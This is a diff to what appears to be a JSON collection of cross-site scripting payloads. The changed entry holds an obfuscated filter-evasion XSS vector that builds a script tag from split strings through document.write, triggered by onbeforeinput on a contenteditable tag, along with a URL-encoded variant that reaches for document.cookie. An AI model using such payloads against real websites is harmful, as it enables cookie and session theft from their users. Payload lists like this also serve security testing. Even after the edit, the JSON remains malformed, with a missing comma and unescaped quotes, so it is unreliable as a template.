@@ -1,12 +1,12 @@
 [
     {
         "description": "XSS using document.write string concatenation obfuscations",
-        "payload": "<xss contenteditable ad=xxx onbeforeinput="document['write']('<','scrip'.slice``,'t','>','aler','t','\u0028document.','domai','n\u0029','</'+'scrip'.slice``,'t','>');" >
+        "payload": "<xss contenteditable ad=xxx onbeforeinput=\"document['write']('<','scrip'.slice``,'t','>','aler','t','\u0028document.','domai','n\u0029','</'+'scrip'.slice``,'t','>');\" >
 
 ENTER HERE
 
 </xss >",
         "urlencoded payload": "<xss%20contenteditable%20ad%3dxxx%20onbeforeinput%3d"document%5b%27write%27%5d(%27<%27%2c%27scrip%27.slice%60%60%2c%27t%27%2c%27>%27%2c%27aler%27%2c%27t%27%2c%27%5cu0028document.%27%2c%27cooki%27%2c%27e%5cu0029%27%2c%27<%2f%27%2b%27scrip%27.slice%60%60%2c%27t%27%2c%27>%27)%3b"%20>%0a%0aENTER%20HERE%0a%0a<%2fxss%20>" 
-        "jsfiddle": ""https://jsfiddle.net/rbarnett/phg2om6x/7/
+        "jsfiddle": "https://jsfiddle.net/rbarnett/phg2om6x/7/"
     }
 ]
